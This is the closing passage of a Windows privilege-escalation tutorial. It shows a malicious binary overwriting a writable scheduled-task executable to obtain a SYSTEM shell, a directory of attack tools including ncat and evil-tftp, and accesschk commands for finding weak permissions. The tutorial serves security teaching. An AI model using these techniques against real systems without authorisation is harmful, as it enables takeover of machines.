&lt;DIR&gt;          .</div><div>02/19/2014  01:36 AM    &lt;DIR&gt;          ..</div><div>04/22/2013  09:39 AM           331,888 accesschk.exe</div><div>02/19/2014  01:31 AM            73,802 evil-tftp.exe</div><div>01/25/2014  12:46 AM            36,864 fubar.exe</div><div>01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</div><div>06/30/2011  01:52 PM         1,667,584 ncat.exe</div><div>02/18/2014  12:38 PM            14,336 wlbsctrl.dll</div><div>11/22/2013  07:39 PM             1,225 wmic_info.bat</div><div>               6 File(s)      2,125,699 bytes</div><div>               3 Dir(s)      75,341,824 bytes free</div><div>Â Â Â Â Â Â Â Â </div><div>C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe</div><div><br/></div><div>Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes</div><div>        1 file(s) copied.</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">To demonstrate this privilege escalation in action I fast-forwarded the system time. From the screenshot below you we can see that we are presented with our SYSTEM shell promptly at 9AM.</div><div    /><div          /><div>          <a href="http://www.fuzzysecurity.com/tutorials/images/priv04_big.png" target="_blank">          <img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/3B87852C-2052-4771-8A83-98D198EEAD24.png" height="160" width="314"/>          </a>          </div><div          /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Schtasks Shell (LogGrabberTFTP)</div><div      /><div    /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>These two examples should give you an idea about the kind of vulnerabilities we need to look for when considering file/folder permissions. You will need to take time to examine ALL the binpaths for the windows services, scheduled tasks and startup tasks.</div><div><br/></div><div>As we have been able to see accesschk is the tool of choice here. Before finishing off I'd like to give you a few final pointers on using accesschk.</div></div><div    /><div><span style="font-weight: bold;"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span></div><div><span style="font-weight: bold;">pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span></div><div><span style="font-weight: bold;">to automatically accept the EULA.</span></div><div><br/></div><div>accesschk.exe /accepteula ... ... ...</div><div><br/></div><div><span style="font-weight: bold;"># Find all weak folder permissions per drive.</span></div><div>accesschk.exe -uwdqs Users c:\</div><div>accesschk.exe -uwdqs "Authenticated Users" c:\</div><div><br/></div><div><span style="font-weight: bold;"># Find all weak file permissions per drive.</span></div><div>accesschk.exe -uwqs Users c:\*.*</div><div>accesschk.exe -uwqs "Authenticated Users" c:\*.*</div><h2>Final Thoughts</h2><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>This guide is meant to be a "fundamentals" for Windows privilege escalation. If you want to truly master the subject you will need to put in a lot of work and research. As with all aspects of pentesting, enumeration is key, the more you know about the target the more avenues of attack you have the higher the rate of success.</div><div><br/></div><div>Also keep in mind that you may sometimes end up elevating your privileges to Administrator. Escalating privileges from Administrator to SYSTEM is a non-issue, you can always reconfigure a service or create a scheduled task with SYSTEM level privileges.</div><div><br/></div><div>Now go forth and pop SYSTEM!!</div></div></div><div><br/></div></body></html>